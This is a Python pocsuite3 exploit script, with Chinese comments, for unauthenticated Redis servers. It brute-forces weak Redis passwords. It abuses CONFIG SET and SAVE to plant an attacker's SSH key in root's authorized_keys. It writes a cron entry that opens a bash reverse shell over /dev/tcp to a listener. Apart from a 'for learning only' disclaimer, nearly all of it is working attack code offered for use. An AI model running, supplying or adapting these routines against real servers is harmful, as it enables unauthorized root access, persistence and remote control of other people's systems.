#!/usr/bin/python
# -*- coding:utf-8 -*-

"""
    描述：
        1.0 redis未授权访问，使用pocsuite3模块重构。
        2.0 增加攻击模块、反弹shell模块
        3.0 修复反弹shell空值报错；优化attack模块，改写脚本为ssh连接
        4.0 增加csv文件记录、优化攻击失败终止
        5.0 增加版本检测功能，搭配 宝er 魔改的redis-rogue-server工具使用，可低权限进入4.x-5.0.5命令执行，然后提权。
    version: 5.0
    author：chen
    date: 2021-08-14
    声明：本脚本只做学习使用，请勿用作非法用途！
"""

# 导入所写PoC所需要类/文件，尽量不要使用第三方模块。
# 迫不得已使用第三方模块有其依赖规则，后面给出。
import os
import re
import socket
import csv
import urllib
from urllib.parse import urlparse
from pocsuite3.api import Output, POCBase, register_poc, get_listener_ip, get_listener_port


# PoC实现类，继承POCBase
class DemoPoc(POCBase):
    # PoC信息字段，需要完整填写全部下列信息
    vulID = '89715'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = 'chen'  # PoC作者的大名
    vulDate = '2015-11-11'  # 漏洞公开的时间,不知道就写今天
    createDate = '2021-07-18'  # 编写PoC的日期
    updateDate = '2021-07-18'  # PoC更新的时间,默认和编写时间一样
    references = ['https://www.seebug.org/vuldb/ssvid-89715']           # 漏洞地址来源,0day不用写
    name = 'redis 未授权访问 PoC'  # PoC名称
    appPowerLink = 'http://redis.io/'  # 漏洞厂商主页地址
    appName = 'Redis'  # 漏洞应用名称
    appVersion = 'all'  # 漏洞影响版本
    vulType = 'Unauthorized access'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        无需密码直接登录，造成信息泄露、远程控制等
    '''
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [socket, csv, re, urllib]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
        pocsuite -r .\89715_redis_login_bypass.py -u 192.168.21.130 --verify
        已完成PoC模式：探测是否存在redis未授权访问以及弱口令  --无限制
        已完成attack模式：写ssh公钥，进行ssh连接   --管理员权限
        已完成shell模式：写定时任务进行反弹shell    --需要管理员权限
    '''

    # 编写验证模式
    def _verify(self):
        result = {}
        # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”
        payload = 'INFO\r\n'
        dic = ['redis', 'root', 'oracle', 'password', 'p@aaw0rd', 'admin123', 'abc123!', '123456', 'admin']
        # 解析url并获取位置（netloc）内容
        ip = urlparse(self.url).netloc
        port = 6379
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.send(payload.encode('utf-8'))
        r = s.recv(1024).decode('utf-8')
        if "redis_version" in r:                # 空密码探测
            version = re.findall(f'redis_version:(.*?)\r\n', r)
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Target'] = ip
            result['VerifyInfo']['Postdata'] = 'redis_version:' + str(version[0])
            with open("redis_verify.csv", "a", newline='') as f:
                writer = csv.writer(f)
                writer.writerow([ip, version[0], ' '])
        elif "Authentication" in r:             # 弱口令爆验证
            for i in dic:
                payload = "AUTH " + i + "\r\n"  # AUTH pass 为redis密码格式
                s.send(payload.encode('utf-8'))
                r = s.recv(1024).decode('utf-8')
                if '+OK' in r:
                    version = re.findall(f'redis_version:(.*?)\r\n', r)
                    result['AdminInfo'] = {}
                    result['AdminInfo']['Password'] = str(ip) + ' ' + str(i)
                    result['VerifyInfo']['Postdata'] = 'redis_version:' + str(version[0])
                    with open("redis_verify.csv", "a", newline='') as f:
                        writer = csv.writer(f)
                        writer.writerow([ip, version[0], i])
        s.close()
        return self.parse_output(result)  # 必须返回result

    # 编写攻击模式
    # 若没有攻击模式，直接写return self._verify()即可
    def _attack(self):
        result = {}
        # 需要redis-cli客户端命令
        # 需要提前在本地生成公钥文件
        # 1、ssh-keygen -t rsa  生成密钥（管理员权限）
        # 2、(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
        # 在公钥目录执行命令，并将key.txt移动到脚本目录
        # windows在用户目录-.ssh下，linux在/root/.ssh/下
        # 只适用linux，若用windows需要更改os.system中读文件cat为more
        # 暂不支持弱口令目标攻击

        ip = urlparse(self.url).netloc
        port = 6379
        # redis-cli发包，将公钥内容设置给变量tide
        os.system('cat key.txt | redis-cli -h ' + str(ip) + ' -x set tide\r\n')
        payload = ['config set dir /root/.ssh\r\n', 'config set dbfilename authorized_keys\r\n', 'save\r\n']
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        for i in payload:
            s.send(i.encode('utf-8'))
            print(i + '...')
            r = s.recv(1024).decode('utf-8')
            if 'OK' in r:
                print(r)
            else:
                print(r)
                break

            print(i, r)
            if 'save' in i and 'OK' in r:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Target'] = 'ssh root@' + str(ip)
                with open("redis_attack.csv", "a", newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['ssh root@' + ip])

        return self.parse_output(result)  # 必须返回result

    # 反弹shell，默认本机6666端口
    def _shell(self):
        result = {}
        rip = get_listener_ip()
        rport = get_listener_port()
        payload = ['config set dir /var/spool/cron/\r\n', 'config set dbfilename root\r\n',
                   'set xxx "\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/'+str(rip)+'/'+str(rport) + ' 0>&1\\n\\n"\r\n',
                   'save\r\n']
        # 第一句也可尝试：config set dir /var/spool/cron/crontabs
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = urlparse(self.url).netloc
        port = 6379
        s.settimeout(5)
        s.connect((ip, port))
        for i in payload:
            s.send(i.encode('utf-8'))
            print(i + '...')
            r = s.recv(1024).decode('utf-8')
            if 'OK' in r:
                print(r)
            else:
                print(r)
                break

            if 'save' in i and 'OK' in r:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Target'] = 'ssh@' + str(ip)
        return self.parse_output(result)

    # 自定义输出函数，调用框架输出的实例Output
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not Unauthorized access')
        return output


# 注册PoC
register_poc(DemoPoc)
# with open("redis_verify.csv", "a", newline='') as f:
#     writer = csv.writer(f)
#     writer.writerow(['IP', '弱口令', '版本号'])
# with open("redis_attack.csv", "a", newline='') as f:
#     writer = csv.writer(f)
#     writer.writerow(['SSH_IP'])


